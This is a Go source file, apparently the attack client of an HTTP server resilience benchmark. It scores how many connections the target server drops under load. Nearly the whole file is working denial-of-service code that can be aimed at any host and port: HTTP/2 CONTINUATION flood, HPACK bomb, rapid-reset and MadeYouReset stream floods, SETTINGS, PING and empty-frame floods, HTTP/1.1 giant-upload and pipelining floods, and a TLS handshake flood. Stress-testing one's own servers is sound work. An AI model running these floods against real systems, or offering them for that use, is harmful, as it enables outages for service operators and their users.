// httparena resilience attacker — a dependency-free (stdlib-only) raw-socket
// attack engine for the GIL-bound resilience attacks, where CPython's GIL caps
// the frame-construction floods (rapid-reset et al.) at ~1 core of real work no
// matter how many cores taskset grants. Goroutines give true parallelism, so a
// ~60-core client can actually outproduce a 2-thread server.
//
// It implements ONLY the speed-critical attacks (the H2 frame floods, the H1
// volume floods, and the TLS-handshake flood). Every other attack — the slow
// holds, the amplification/parser attacks, the WebSocket attacks and dheat
// (Go's crypto/tls offers no finite-field DHE) — stays in attack.py, which is
// not rate-bound and where the GIL is not the bottleneck.
//
// Output: ONE line of JSON on stdout, the same shape attack.py emits, so
// resilience_results.py scores either client without caring which ran.
//
//	established     — connections that completed connect + H2 preface / TCP
//	reaped          — established conns the SERVER then dropped mid-attack (a
//	                  defense: a timeout or a frame/stream cap fired)
//	connect_errors  — conns that never established (refused / handshake fail);
//	                  NOT a defense — kept separate so a down server can't read
//	                  as "reaped everything"
//	frames_sent / bytes_sent — offered volume
package main

import (
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var h2Preface = []byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")

type stats struct {
	Attack        string  `json:"attack"`
	ConnsReq      int     `json:"conns_requested"`
	Established   int64   `json:"established"`
	Reaped        int64   `json:"reaped"`
	OpenAtEnd     int64   `json:"open_at_end"`
	ConnectErrors int64   `json:"connect_errors"`
	FramesSent    int64   `json:"frames_sent"`
	BytesSent     int64   `json:"bytes_sent"`
	ElapsedS      float64 `json:"elapsed_s"`
	Client        string  `json:"client"`
}

type config struct {
	attack        string
	host          string
	port          int
	path          string
	conns         int
	duration      time.Duration
	useTLS        bool
	uploadSize    int64
	pipelineDepth int
}

func (c *config) addr() string { return fmt.Sprintf("%s:%d", c.host, c.port) }

// ── HTTP/2 framing (hand-rolled; no x/net dependency) ──────────────────────

// frame builds one HTTP/2 frame: 24-bit length, type, flags, 31-bit stream id.
func frame(ftype, flags byte, stream uint32, payload []byte) []byte {
	n := len(payload)
	buf := make([]byte, 9+n)
	buf[0], buf[1], buf[2] = byte(n>>16), byte(n>>8), byte(n)
	buf[3], buf[4] = ftype, flags
	binary.BigEndian.PutUint32(buf[5:9], stream&0x7fffffff)
	copy(buf[9:], payload)
	return buf
}

// hpackInt encodes an HPACK integer with the given prefix width.
func hpackInt(value, prefixBits int) []byte {
	mask := (1 << prefixBits) - 1
	if value < mask {
		return []byte{byte(value)}
	}
	out := []byte{byte(mask)}
	value -= mask
	for value >= 128 {
		out = append(out, byte(value&0x7f)|0x80)
		value >>= 7
	}
	return append(out, byte(value))
}

// hpackStr encodes a raw (un-Huffman'd) HPACK string literal.
func hpackStr(data []byte) []byte { return append(hpackInt(len(data), 7), data...) }

// h2GetBlock: a minimal valid HEADERS block for GET <path> on :authority.
// :method GET (0x82), :scheme http (0x86), :path / (0x84) are static-table
// indices; :authority is a literal-without-indexing (0x01 + name idx 1).
func h2GetBlock(authority string) []byte {
	return append([]byte{0x82, 0x86, 0x84, 0x01}, hpackStr([]byte(authority))...)
}

// hpackFiller returns exactly `size` bytes of never-indexed literal headers,
// used to pad CONTINUATION frames (continuation-flood).
func hpackFiller(size int) []byte {
	out := make([]byte, 0, size+64)
	for k := 0; len(out) < size; k++ {
		name := []byte(fmt.Sprintf("x-pad-%x", k))
		val := make([]byte, 32)
		for i := range val {
			val[i] = 'a'
		}
		out = append(out, 0x00) // literal, never indexed, new name
		out = append(out, hpackStr(name)...)
		out = append(out, hpackStr(val)...)
	}
	return out[:size] // never overshoot SETTINGS_MAX_FRAME_SIZE
}

// dial opens a raw TCP (optionally TLS, with the given ALPN) connection.
func dial(c *config, alpn string) (net.Conn, error) {
	d := &net.Dialer{Timeout: 5 * time.Second}
	if c.useTLS {
		return tls.DialWithDialer(d, "tcp", c.addr(), &tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{alpn},
		})
	}
	return d.Dial("tcp", c.addr())
}

// counter batches a goroutine's frame/byte tallies and flushes them to the
// shared atomics every flushEvery frames. That keeps the hot path off a
// per-frame atomic add (which would cache-line-bounce across ~60 goroutines and
// gut throughput) while still letting a mid-run signal reader see near-live
// totals — the remainder (<flushEvery) is flushed on done().
const (
	flushEvery = 4096            // frames
	flushBytes = int64(64) << 20 // or 64 MiB, whichever comes first
)

type counter struct {
	st         *stats
	accF, accB int64
}

// tally records `frames` frames and `bytes` bytes, flushing to the shared
// atomics once either batch threshold is crossed. Volume attacks pass (0,n) per
// chunk and (1,0) per completed request; the frame floods pass (1,len).
func (ct *counter) tally(frames, bytes int64) {
	ct.accF += frames
	ct.accB += bytes
	if ct.accF >= flushEvery || ct.accB >= flushBytes {
		ct.flush()
	}
}

func (ct *counter) flush() {
	if ct.accF != 0 || ct.accB != 0 {
		atomic.AddInt64(&ct.st.FramesSent, ct.accF)
		atomic.AddInt64(&ct.st.BytesSent, ct.accB)
		ct.accF, ct.accB = 0, 0
	}
}

func (ct *counter) done() { ct.flush() }

// ── generic per-connection fan-out ─────────────────────────────────────────

// fanout runs `body` on `conns` goroutines, each on its own connection. body
// gets a live conn and the shared deadline and returns `reaped` — whether the
// SERVER dropped this established connection (a defense). body tallies its own
// frames/bytes through a counter (so a mid-run signal sees near-live totals);
// fanout owns only established/reaped. Connect/preface failures are counted as
// connect_errors and body is not called.
func fanout(c *config, st *stats, alpn string, preface func(net.Conn) error,
	body func(conn net.Conn, deadline time.Time) bool) {
	deadline := time.Now().Add(c.duration)
	var wg sync.WaitGroup
	for i := 0; i < c.conns; i++ {
		if time.Now().After(deadline) {
			break
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := dial(c, alpn)
			if err != nil {
				atomic.AddInt64(&st.ConnectErrors, 1)
				return
			}
			defer conn.Close()
			if preface != nil {
				if err := preface(conn); err != nil {
					atomic.AddInt64(&st.ConnectErrors, 1)
					return
				}
			}
			atomic.AddInt64(&st.Established, 1)
			if body(conn, deadline) {
				atomic.AddInt64(&st.Reaped, 1)
			}
		}()
	}
	wg.Wait()
}

// h2Preamble writes the connection preface + an empty SETTINGS frame.
func h2Preamble(conn net.Conn) error {
	if _, err := conn.Write(h2Preface); err != nil {
		return err
	}
	_, err := conn.Write(frame(0x4, 0, 0, nil))
	return err
}

// writeLoop re-sends `payload` until the deadline or the server drops us.
// Used by the floods whose per-iteration frame is constant. Returns reaped.
func writeLoop(conn net.Conn, deadline time.Time, st *stats, lead []byte, payload []byte) bool {
	ct := counter{st: st}
	defer ct.done()
	if lead != nil {
		if _, err := conn.Write(lead); err != nil {
			return true
		}
		ct.tally(1, int64(len(lead)))
	}
	for time.Now().Before(deadline) {
		if _, err := conn.Write(payload); err != nil {
			return true
		}
		ct.tally(1, int64(len(payload)))
	}
	return false
}

// ── HTTP/2 attacks ─────────────────────────────────────────────────────────

func continuationFlood(c *config, st *stats) {
	lead := frame(0x1, 0x1, 1, h2GetBlock(c.host)) // HEADERS, END_STREAM, no END_HEADERS
	cont := frame(0x9, 0x0, 1, hpackFiller(16384))  // CONTINUATION, never END_HEADERS
	fanout(c, st, "h2", h2Preamble, func(conn net.Conn, dl time.Time) bool {
		return writeLoop(conn, dl, st, lead, cont)
	})
}

func hpackBomb(c *config, st *stats) {
	// One oversized dynamic-table entry, then a flood of 1-byte references
	// (0xBE = indexed header field, dynamic index 62) that each re-expand it.
	bigVal := make([]byte, 3900)
	for i := range bigVal {
		bigVal[i] = 'a'
	}
	initial := append([]byte{0x82, 0x86, 0x84, 0x01}, hpackStr([]byte(c.host))...)
	initial = append(initial, 0x40)                     // literal WITH incremental indexing, new name
	initial = append(initial, hpackStr([]byte("x-b"))...) // name
	initial = append(initial, hpackStr(bigVal)...)        // 3900-byte value → into dynamic table
	refs := make([]byte, 16384)
	for i := range refs {
		refs[i] = 0xBE
	}
	lead := frame(0x1, 0x1, 1, initial)
	cont := frame(0x9, 0x0, 1, refs)
	fanout(c, st, "h2", h2Preamble, func(conn net.Conn, dl time.Time) bool {
		return writeLoop(conn, dl, st, lead, cont)
	})
}

func rapidReset(c *config, st *stats) {
	hdr := h2GetBlock(c.host)
	rst := []byte{0, 0, 0, 8} // RST_STREAM, error code CANCEL (0x8)
	fanout(c, st, "h2", h2Preamble, func(conn net.Conn, dl time.Time) bool {
		ct := counter{st: st}
		defer ct.done()
		var sid uint32 = 1
		for time.Now().Before(dl) && sid < 0x7fffffff {
			msg := append(frame(0x1, 0x5, sid, hdr), frame(0x3, 0x0, sid, rst)...)
			if _, err := conn.Write(msg); err != nil {
				return true
			}
			ct.tally(1, int64(len(msg)))
			sid += 2
		}
		return false
	})
}

func madeYouReset(c *config, st *stats) {
	// Open a stream, then provoke the SERVER into sending RST_STREAM by sending
	// a protocol error on it (WINDOW_UPDATE with a 0 increment) — the server
	// does the per-stream reset work, sidestepping client-side rapid-reset caps.
	hdr := h2GetBlock(c.host)
	badWU := []byte{0, 0, 0, 0} // WINDOW_UPDATE increment 0 → PROTOCOL_ERROR
	fanout(c, st, "h2", h2Preamble, func(conn net.Conn, dl time.Time) bool {
		ct := counter{st: st}
		defer ct.done()
		var sid uint32 = 1
		for time.Now().Before(dl) && sid < 0x7fffffff {
			msg := append(frame(0x1, 0x5, sid, hdr), frame(0x8, 0x0, sid, badWU)...)
			if _, err := conn.Write(msg); err != nil {
				return true
			}
			ct.tally(1, int64(len(msg)))
			sid += 2
		}
		return false
	})
}

func settingsFlood(c *config, st *stats) {
	fanout(c, st, "h2", h2Preamble, func(conn net.Conn, dl time.Time) bool {
		return writeLoop(conn, dl, st, nil, frame(0x4, 0x0, 0, nil)) // empty SETTINGS → forces ACK
	})
}

func pingFlood(c *config, st *stats) {
	fanout(c, st, "h2", h2Preamble, func(conn net.Conn, dl time.Time) bool {
		return writeLoop(conn, dl, st, nil, frame(0x6, 0x0, 0, make([]byte, 8))) // PING → forces ACK
	})
}

func emptyFrameFlood(c *config, st *stats) {
	lead := frame(0x1, 0x4, 1, h2GetBlock(c.host)) // HEADERS, END_HEADERS, keep stream open
	empty := frame(0x0, 0x0, 1, nil)               // 0-length DATA, no END_STREAM
	fanout(c, st, "h2", h2Preamble, func(conn net.Conn, dl time.Time) bool {
		return writeLoop(conn, dl, st, lead, empty)
	})
}

// ── HTTP/1.1 volume attacks ────────────────────────────────────────────────

func largeUpload(c *config, st *stats) {
	headers := []byte(fmt.Sprintf(
		"POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\n\r\n",
		c.path, c.host, c.uploadSize))
	chunk := make([]byte, 1<<20) // 1 MiB write buffer
	for i := range chunk {
		chunk[i] = 'A'
	}
	alpn := "http/1.1"
	fanout(c, st, alpn, nil, func(conn net.Conn, dl time.Time) bool {
		ct := counter{st: st}
		defer ct.done()
		rbuf := make([]byte, 4096)
		for time.Now().Before(dl) {
			conn.SetWriteDeadline(time.Now().Add(15 * time.Second))
			if _, err := conn.Write(headers); err != nil {
				return true
			}
			remaining := c.uploadSize
			for remaining > 0 && time.Now().Before(dl) {
				n := int64(len(chunk))
				if n > remaining {
					n = remaining
				}
				if _, err := conn.Write(chunk[:n]); err != nil {
					return true // server capped the body and dropped us
				}
				ct.tally(0, n) // bytes, no completed request yet
				remaining -= n
			}
			ct.tally(1, 0) // one upload completed
			conn.SetReadDeadline(time.Now().Add(1 * time.Second))
			if _, err := conn.Read(rbuf); err != nil {
				// a reset/close after the body is also the server shedding us
				if ne, ok := err.(net.Error); !ok || !ne.Timeout() {
					return true
				}
			}
		}
		return false
	})
}

func pipeliningFlood(c *config, st *stats) {
	one := []byte(fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", c.path, c.host))
	batch := make([]byte, 0, len(one)*c.pipelineDepth)
	for i := 0; i < c.pipelineDepth; i++ {
		batch = append(batch, one...)
	}
	alpn := "http/1.1"
	fanout(c, st, alpn, nil, func(conn net.Conn, dl time.Time) bool {
		ct := counter{st: st}
		defer ct.done()
		for time.Now().Before(dl) {
			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			if _, err := conn.Write(batch); err != nil {
				return true
			}
			ct.tally(int64(c.pipelineDepth), int64(len(batch)))
		}
		return false
	})
}

// ── TLS handshake flood ────────────────────────────────────────────────────

func tlsHandshakeFlood(c *config, st *stats) {
	// Each worker opens full TLS handshakes back-to-back and drops them — the
	// cost is the server's asymmetric key-exchange per handshake, not bytes.
	deadline := time.Now().Add(c.duration)
	var wg sync.WaitGroup
	for i := 0; i < c.conns; i++ {
		if time.Now().After(deadline) {
			break
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			var hs int64
			established := false
			for time.Now().Before(deadline) {
				conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 5 * time.Second},
					"tcp", c.addr(), &tls.Config{InsecureSkipVerify: true})
				if err != nil {
					if !established {
						atomic.AddInt64(&st.ConnectErrors, 1)
					}
					return
				}
				established = true
				hs++
				conn.Close()
			}
			if established {
				atomic.AddInt64(&st.Established, 1)
			}
			atomic.AddInt64(&st.FramesSent, hs) // handshakes completed
		}()
	}
	wg.Wait()
}

// ── entry point ────────────────────────────────────────────────────────────

// goAttacks is the set this client owns; resilience.sh dispatches exactly these
// here and everything else to attack.py. Keep in sync with the switch below.
var goAttacks = map[string]func(*config, *stats){
	"continuation-flood":  continuationFlood,
	"hpack-bomb":          hpackBomb,
	"rapid-reset":         rapidReset,
	"madeyoureset":        madeYouReset,
	"settings-flood":      settingsFlood,
	"ping-flood":          pingFlood,
	"empty-frame-flood":   emptyFrameFlood,
	"large-upload":        largeUpload,
	"pipelining-flood":    pipeliningFlood,
	"tls-handshake-flood": tlsHandshakeFlood,
}

func main() {
	c := &config{}
	flag.StringVar(&c.attack, "attack", "", "attack name")
	flag.StringVar(&c.host, "host", "127.0.0.1", "target host (also HTTP/2 :authority)")
	flag.IntVar(&c.port, "port", 0, "target port")
	flag.StringVar(&c.path, "path", "/", "request path")
	flag.IntVar(&c.conns, "conns", 256, "concurrent connections")
	var durSec float64
	flag.Float64Var(&durSec, "duration", 25, "seconds")
	flag.BoolVar(&c.useTLS, "tls", false, "wrap the socket in TLS")
	flag.Int64Var(&c.uploadSize, "upload-size", 2147483648, "large-upload body bytes")
	flag.IntVar(&c.pipelineDepth, "pipeline-depth", 10000, "pipelining-flood batch depth")

	// attack.py-shared flags this client does not use, declared so a shared
	// invocation (resilience.sh passes the full set) parses cleanly.
	for _, name := range []string{
		"body-size", "drip-interval", "drip-bytes", "bomb-size", "hashdos-keys",
		"json-depth", "multipart-parts", "redos-pad", "stall-count", "stall-streams",
		"cl-declare", "chunk-ext-size", "chunk-count", "header-value-size",
		"header-count", "dup-headers", "qvalue-count", "cookie-pairs",
		"percent-count", "range-count", "bignum-digits", "ws-frame-len", "ws-frag-size",
	} {
		var ignored string
		flag.StringVar(&ignored, name, "", "(ignored by the Go client)")
	}
	flag.Parse()
	c.duration = time.Duration(durSec * float64(time.Second))

	run, ok := goAttacks[c.attack]
	if !ok {
		fmt.Fprintf(os.Stderr, "resilience-attacker: attack %q is not handled by the Go client\n", c.attack)
		os.Exit(2)
	}

	st := &stats{Attack: c.attack, ConnsReq: c.conns, Client: "go"}
	start := time.Now()

	// Emit the stats line exactly once — whether the attack runs to completion
	// or resilience.sh kills us early (the server died; its early-exit sends
	// SIGTERM). On an early kill we still report what we offered up to that
	// point, so a crash verdict keeps its established/reaped/bytes context.
	var once sync.Once
	flush := func() {
		once.Do(func() {
			snap := stats{
				Attack: st.Attack, ConnsReq: st.ConnsReq, Client: st.Client,
				Established:   atomic.LoadInt64(&st.Established),
				Reaped:        atomic.LoadInt64(&st.Reaped),
				ConnectErrors: atomic.LoadInt64(&st.ConnectErrors),
				FramesSent:    atomic.LoadInt64(&st.FramesSent),
				BytesSent:     atomic.LoadInt64(&st.BytesSent),
				ElapsedS:      time.Since(start).Seconds(),
			}
			// Connections still held when the attack ended (not reaped) — the
			// scorer surfaces this next to reaped/established in the PR comment.
			snap.OpenAtEnd = snap.Established - snap.Reaped
			json.NewEncoder(os.Stdout).Encode(&snap)
		})
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGTERM, syscall.SIGINT)
	go func() { <-sig; flush(); os.Exit(0) }()

	run(c, st)
	flush()
}
